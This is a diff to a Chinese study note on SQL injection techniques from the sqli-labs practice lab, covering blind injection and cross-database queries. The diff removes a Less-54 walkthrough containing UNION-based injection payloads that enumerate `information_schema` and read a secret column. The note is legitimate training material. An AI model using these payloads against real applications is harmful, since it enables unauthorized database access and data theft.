@@ -129,7 +129,7 @@ SET SESSION group_concat_max_len = 100000;
 
 # 六、盲注
 
-> 实战结论来源：sqli-labs **Less-15**（布尔盲注）、**Less-9**（时间盲注）、**Less-54**（跨库读 `challenges`），2026-10-07 本机实测。
+> 实战结论来源：sqli-labs **Less-15**（布尔盲注）、**Less-9**（时间盲注），2026-10-07 本机实测。
 
 ## 6.1 先分清是布尔还是时间（**别选错**）
 
@@ -221,23 +221,10 @@ select group_concat(column_name) from information_schema.columns
 select * from users      -- 解析成 <默认库>.users（sqli-labs 里默认库 = security）
 ```
 
-**跨库必须写全名**，表名是随机的时候还要反引号：
+**跨库要写全名**（库名 + 表名，表名是随机的或含特殊字符时加反引号）：
 
 ```sql
-select `secret_9WEI` from `challenges`.`7j2ha5vhrn`
-```
-
-**Less-54 流程**（只有 10 次尝试，所以要「贪婪」：一次请求取尽可能多）：
-
-```sql
--- ① 表名（用 # 吃掉原句的 LIMIT 0,1）
--1' union select (select group_concat(table_name) from information_schema.tables
-                  where table_schema='challenges'),2 #
--- ② 列名
--1' union select (select group_concat(column_name) from information_schema.columns
-                  where table_schema='challenges' and column_name like 'secret%'),2 #
--- ③ 读值
--1' union select (select `secret_9WEI` from `7j2ha5vhrn` limit 0,1),2 #
+select * from `otherdb`.`sometable`
 ```
 
 > 本题的挑战表名/列名是**每次 reset 随机**的，所以必须先查 `information_schema` 再读值 —— 顺序不能反。
